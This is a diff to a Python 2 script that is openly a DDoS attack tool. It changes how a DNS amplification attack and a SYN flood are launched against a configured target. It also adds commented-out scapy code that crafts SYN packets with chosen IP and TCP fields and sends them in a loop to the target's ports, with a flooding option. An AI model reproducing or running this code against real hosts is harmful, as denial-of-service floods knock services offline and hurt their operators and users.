@@ -1,12 +1,18 @@
 #!/usr/bin/env python
-import logging
-logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 import sys
 import time
 import socket
 import struct
 import threading
+import subprocess
+
+#from scapy.packet import ls
+#from scapy.sendrecv import srloop
+#from scapy.volatile import RandShort
+from scapy.layers.inet import IP, TCP
+
 from CFGClass import *
+from random import randint
 from optparse import OptionParser
 import ConfigParser
 from multiprocessing import Process, Manager
@@ -14,7 +20,7 @@ import urlparse
 import random
 from scapy.all import *
 from amplificationStav import files, GetDomainList, DDoS, Benchmark, Monitor
-from packetSenderManager import PacketSenderManager, monitorNetwork
+from packetSenderManager import PacketSenderManager
 
 USAGE = '''
 %prog ddos amplification [options]	# DNS Amplification attack
@@ -757,7 +763,6 @@ def main():
                         event.set()
                         try:
                             ddos = DDoS(socket.gethostbyname(targetip), configFileHelper.dnsAmp.threads, domains, event)
-                            print ' AMPLIFIED DDoS STARTED...'
                             print 'Amplificated DDoS started for enabled vectors..'
                             ddos.stress()
                             Monitor()
@@ -767,20 +772,56 @@ def main():
                             event.clear()
 
                     if configFileHelper.synFlood.enabled == 'yes':
-                        print ''
-                        print 'SYN DDoS HAS STARTED...'
-                        print 'SYN FLOODING MODE ' + str(configFileHelper.synFlood.flooding).upper()
+                        print 'SYN Flood DDoS is started...'
                         event = threading.Event()
                         event.set()
                         try:
                             packetSenderManager = PacketSenderManager(configFileHelper, 'TCP', event)
-                            packetSenderManager.stress()
-                            monitorNetwork()
-                            event.clear()
+                            packetSenderManager.startTCPSender()
+                            packetSenderManager.monitorNetwork()
                         except KeyboardInterrupt:
-                            print '\nInterrupted in main..'
+                            print '\nInterrupted..'
                             event.clear()
-                        # else:
+                        ####	hping3 scriptini koy
+                        # conf.verb=0
+                        # print "Field Values of packet sent"
+                        # ports = (configFileHelper.synFlood.port)
+                        # portList = ports.split(',')
+                        # intPortList = map(int, portList)
+                        # # print ports
+                        # # print portList
+                        # # print intPortList
+                        # p = IP(dst=configFileHelper.synFlood.targetIp, id=1111, ttl=255) / TCP(sport=RandShort(),
+                        #                                                                        dport=intPortList,
+                        #                                                                        seq=12345, ack=1000,
+                        #                                                                        window=1000,
+                        #                                                                        flags="S") / "SZR_TPRK"
+                        # ls(p)
+                        # if configFileHelper.synFlood.flooding == 'yes':
+                        #     print "Sending Packets in 0.3 second intervals for timeout of 4 sec"
+                        #     ans, unans = srloop(p, inter=0.1, retry=1, timeout=2)
+                        #     # print "Summary of answered & unanswered packets"
+                        #     # ans.summary()
+                        #     # unans.summary()
+                        #     print "source port flags in response"
+                        #     # for s,r in ans:
+                        #     # print r.sprintf("%TCP.sport% \t %TCP.flags%")
+                        #     ans.make_table(
+                        #         lambda (s, r): (s.dst, s.dport, r.sprintf("%IP.id% \t %IP.ttl% \t %TCP.flags%")))
+                        # elif configFileHelper.synFlood.flooding == 'no':
+                        #     print 'Flooding mode disabled.'
+                        #     print str(configFileHelper.synFlood.packetCount) + ' packets will be sent..'
+                        #     ans, unans = srloop(p, inter=0.1, retry=1, timeout=2,
+                        #                         count=configFileHelper.synFlood.packetCount)
+                        #     # print "Summary of answered & unanswered packets"
+                        #     # ans.summary()
+                        #     # unans.summary()
+                        #     print "source port flags in response"
+                        #     # for s,r in ans:
+                        #     # print r.sprintf("%TCP.sport% \t %TCP.flags%")
+                        #     ans.make_table(
+                        #         lambda (s, r): (s.dst, s.dport, r.sprintf("%IP.id% \t %IP.ttl% \t %TCP.flags%")))
+                        #     # else:
                             # 	print 'Supply proper argument'
                             # 	parser.print_help()
                             # 	#print OPTIONS
